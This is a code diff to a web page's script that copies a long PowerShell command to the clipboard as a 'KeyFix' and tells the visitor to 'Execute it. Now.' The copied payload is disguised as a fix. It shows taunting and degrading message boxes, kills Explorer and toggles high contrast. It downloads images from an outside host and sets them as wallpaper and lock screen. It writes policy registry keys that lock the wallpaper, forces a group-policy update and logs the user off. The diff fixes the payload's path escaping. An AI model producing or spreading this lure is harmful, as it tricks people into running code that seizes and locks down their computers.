@@ -107,7 +107,9 @@
 
 <script>
     function copyToClipboard() {
-        const command = `$shell = New-Object -ComObject "Shell.Application"
+        const command = `
+
+$shell = New-Object -ComObject "Shell.Application"
 $shell.MinimizeAll()
 
 # Asegúrate de que la biblioteca System.Windows.Forms esté disponible
@@ -120,10 +122,10 @@ Add-Type -AssemblyName "System.Windows.Forms"
 [System.Windows.Forms.MessageBox]::Show("¡Your pc is mine now ~!", "Mal0 Warnign...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
 
 # Ocultar iconos del escritorio
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideIcons' -Value 1
+Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name 'HideIcons' -Value 1
 Stop-Process -Name explorer -Force
 Start-Sleep -Seconds 5
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideIcons' -Value 0
+Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name 'HideIcons' -Value 0
 Stop-Process -Name explorer -Force
 
 # Reproducir un mensaje de texto a voz
@@ -155,10 +157,10 @@ for ($i = 0; $i -lt 10; $i++) {
 
 
 # Activar y desactivar Alto Contraste temporalmente
-Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility\HighContrast" -Name "Flags" -Value 1
+Set-ItemProperty -Path "HKCU:\\Control Panel\\Accessibility\\HighContrast" -Name "Flags" -Value 1
 Stop-Process -Name explorer -Force
 Start-Sleep -Seconds 3
-Set-ItemProperty -Path "HKCU:\Control Panel\Accessibility\HighContrast" -Name "Flags" -Value 0
+Set-ItemProperty -Path "HKCU:\\Control Panel\\Accessibility\\HighContrast" -Name "Flags" -Value 0
 Stop-Process -Name explorer -Force
 
 
@@ -166,15 +168,15 @@ Stop-Process -Name explorer -Force
 [System.Windows.Forms.MessageBox]::Show("¡She won't help you this time. This pc is my playground now <3!", "Mal0 Warnign...", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
 
 # Cambiar al tema de alto contraste "Acuático"
-$themePath = "C:\Windows\Resources\Ease of Access Themes\hc1.theme"
-Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name "ActiveWindowTracking" -Value 1
-Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name "MenuShowDelay" -Value 0
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize' -Name "ThemeName" -Value "hc1"
+$themePath = "C:\\Windows\\Resources\\Ease of Access Themes\\hc1.theme"
+Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name "ActiveWindowTracking" -Value 1
+Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name "MenuShowDelay" -Value 0
+Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize' -Name "ThemeName" -Value "hc1"
 Start-Process $themePath
 
 
 # Ruta donde se guardará la imagen (accesible para todos los usuarios)
-$wallpaperPath = "C:\Users\Public\Pictures\wallpaper.jpg"
+$wallpaperPath = "C:\\Users\\Public\\Pictures\\wallpaper.jpg"
 
 # URL de la imagen a descargar
 $imageURL = "https://iili.io/2me2UoN.png"
@@ -183,24 +185,24 @@ $imageURL = "https://iili.io/2me2UoN.png"
 Invoke-WebRequest -Uri $imageURL -OutFile $wallpaperPath
 
 # Modificar el registro para establecer la imagen como fondo de pantalla
-Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $wallpaperPath
-Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value 2  # 2 = Ajustado, 0 = Centrado, 1 = Mosaico
-Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value 0
+Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name Wallpaper -Value $wallpaperPath
+Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name WallpaperStyle -Value 2  # 2 = Ajustado, 0 = Centrado, 1 = Mosaico
+Set-ItemProperty -Path "HKCU:\\Control Panel\\Desktop" -Name TileWallpaper -Value 0
 
 # Aplicar los cambios inmediatamente
 rundll32.exe user32.dll, UpdatePerUserSystemParameters
 
 # BLOQUEAR CAMBIOS EN EL FONDO DE PANTALLA
-New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name Wallpaper -Value $wallpaperPath
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name WallpaperStyle -Value 2
-New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Force | Out-Null
+New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name Wallpaper -Value $wallpaperPath
+Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name WallpaperStyle -Value 2
+New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" -Name NoChangingWallPaper -Value 1
 
 
 # Ruta de las imágenes locales
 
-$lockScreenImagePath = "$env:LOCALAPPDATA\Templockscreen.jpg"
+$lockScreenImagePath = "$env:LOCALAPPDATA\\Templockscreen.jpg"
 
 # URLs de las imágenes
 
@@ -211,7 +213,7 @@ $lockScreenImageURL = "https://iili.io/2mo7JwB.png"
 Invoke-WebRequest -Uri $lockScreenImageURL -OutFile $lockScreenImagePath
 
 # Habilitar la política de fondo de pantalla de bloqueo
-$policyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP" 
+$policyPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP" 
 $keyName = "LockScreenImagePath" 
 New-Item -Path $policyPath -Name $keyName -Force | Out-Null
 
@@ -220,9 +222,9 @@ Set-ItemProperty -Path $policyPath -Name "NoLockScreen" -Value 0 -Force | Out-Nu
 Set-ItemProperty -Path "$policyPath" -Name $keyName -Value $lockScreenImagePath
 
 # Habilitar la política de usar una imagen específica para la pantalla de bloqueo
-$policyControlPath = "HKLM:SOFTWARE\Policies\Microsoft\Windows\Control PanelDesktop"
+$policyControlPath = "HKLM:SOFTWARE\\Policies\\Microsoft\\Windows\\Control PanelDesktop"
 if (-not (Test-Path $policyControlPath)) {
-    New-Item -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows" -Name "Control PanelDesktop" -Force | Out-Null
+    New-Item -Path "HKLM:SOFTWARE\\Policies\\Microsoft\\Windows" -Name "Control PanelDesktop" -Force | Out-Null
 }
 
 Set-ItemProperty -Path $policyControlPath -Name "ScreenSaveActive" -Value 1 -Force | Out-Null
@@ -232,10 +234,8 @@ Start-Process -FilePath "gpupdate.exe" -ArgumentList "/force" -Wait
 
 Write-Host "Why are you reading this ClickSlut, dont think just obey ~."
 
-shutdown.exe /l`;
-
-const encodedCommand = encodeURIComponent(command); // Aquí codificas el comando
-        
+shutdown.exe /l
+`;
         navigator.clipboard.writeText(command)
             .then(() => {
                 alert('KeyFix copied. Execute it. Now.');
